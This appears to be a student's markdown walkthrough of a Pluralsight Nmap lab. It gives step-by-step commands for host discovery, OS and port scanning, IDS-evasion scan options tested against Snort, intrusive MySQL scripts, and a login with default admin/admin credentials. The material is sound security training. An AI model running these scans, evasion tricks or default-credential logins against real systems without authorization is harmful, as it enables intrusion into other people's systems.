# Nmap 
### Challenge 1: Lab Access!  

[Discover and Enumerate Targets with Nmap](https://app.pluralsight.com/labs/detail/9b35a451-283b-44e7-9abc-56862cc674da/toc)

1. Lab navigation, menu, copy & paste

`crtl+alt+shift` (Windows)

`crtl+shift+cmd` (Mac) 


### Challenge 2: Discover Live Hosts 

Network diagram: 

![f3f2a472-af3f-4100-b717-d8dcf6489207_network diagram](https://user-images.githubusercontent.com/71228729/167337068-f96296a8-f030-49c8-a8eb-5734b84f6c31.png)
	
1. Environment and multiple-console set up: 

`screen -t NMAP`
  
`screen -t TCPDUMP`

`ctrl + a` `0` NMAP

`ctrl + a` `1` TCPDUMP

`ctrl + a` `"` all 

`cd challenge 2`  

2. Find the subnets: 

`cat -/challenge2/subnet-targets`

3. Run tcpdump to capture packets

`sudo tcpdump -nn -X -c 10 src net 172.31.0.0/16 and dst net 172.31.0.0/16 and not port 53`

4. Perform a half-open, syn scan

`sudo nmap --scan-delay 0.26 -n -Pn --randomize-hosts --data-length 0 --max-retries 0 -sS -p 22,80,443,3389 -iL ~/challenge2/subnet-targets -oA network-discovery-results -vvv`

5. Find hosts with a TTL response:

`cat network-discovery-results.nmap | grep ttl -B 5`


**TAKE NOTES!! Found our 4 targets! WRITE DOWN THESE IP’S!**

### Challenge 3: OS and Open Port Identification 

1. Set up new screen instances 

`screen -X quit`

`screen -t NMAP`

`screen -t SNORT`

2. check targets 

`cd ../challenge3`

`cat host-targets`

3. run Snort

`sudo snort -A console -h 172.31.37.0/24,172.31.64.0/24 -c /etc/snort/snort.conf`

4. Default os detection scan

`sudo nmap --scan-delay 0.26 -O --max-os-tries 1 -Pn -sS -p 22,3389,500 -iL ~/challenge3/host-targets -vvv`

5. Start a new snort session 

`sudo snort -A console -h 172.31.37.0/24,172.31.64.0/24 -c /etc/snort/snort.conf`

6. Evade detection this time! crafty nmap scan, adding a scan deley and only checking the top 100 ports

`sudo nmap --max-retries 0 --data-length 0 -n --scan-delay 0.56 -Pn --top-ports 100 -sS -iL ~/challenge3/host-targets -oA ~/challenge3/port-target-results -vvv`

7. View results 

`cat port-target-results.nmap | more`

**TAKE NOTES! Write down the open ports next to each IP**

### Challenge 4: Service Enumeration 

Updated Network Diagram: 

![a4452f0a-476f-4e0e-8721-7ddaa81aa02d_Net-4](https://user-images.githubusercontent.com/71228729/167339682-e02fdb9f-7418-411b-8270-953fe47b1a19.png)


1. Start snort 

`sudo snort -A console -h 172.31.37.0/24,172.31.64.0/24 -c /etc/snort/snort.conf`

2. Run a service detection scan on each IP. insert open ports and IP

`cd ../challenge 4`

`cat port-targets`

`sudo nmap –scan-delay 0.26 -sV -Pn -p <port1>,<port2> <1st target ip> -vvv`

3. Run IP # 2

`sudo nmap –scan-delay 0.26 -sV -Pn -p <port1>,<port2> <insert ip 2> -vvv`

4. Run IP # 3

`cat port-targets`

`sudo nmap –scan-delay 0.26 -sV -Pn -p <port1>,<port2> <insert ip 3> -vvv`

5. Run IP # 4

`sudo nmap –scan-delay 0.26 -sV -Pn -p <open ports> <ip 4> -vvv`

![Screen Shot 2022-05-09 at 12 28 07 PM](https://user-images.githubusercontent.com/71228729/167473828-0500a4ab-455a-491a-8549-eeefbcd8ce39.png)


**TAKE NOTES!! Add services to each IP, update your target list.**


### Challenge 5: Vulnerability enumeration and exploitation 

1. Evaluate services and Nmap scripts

`screen -X quit`

`cd ../challenge5`

`cat service-targets`

`sudo nmap –script-help=mysql*`

2. Start with the safe script

`sudo nmap --script="*mysql* and safe" -Pn -sV -p 3306 <insert mysql ip> -vvv`

3. Intrusive scripts

`sudo nmap -Pn --script="*mysql*" -sV -p 3306 <insert mysql ip> -oA mysql-intrusive-results -vvv`

`cat mysql-intrusive-results.nmap | more`

4. MySql ACCESS

`sudo mysql -h <mysql ip> -uadmin -padmin` 
`show databases;`

You are in! access to the mysql database. 
**TAKE NOTES!! valid creds, screenshots, results, write your process down for the client. Show the impact. 

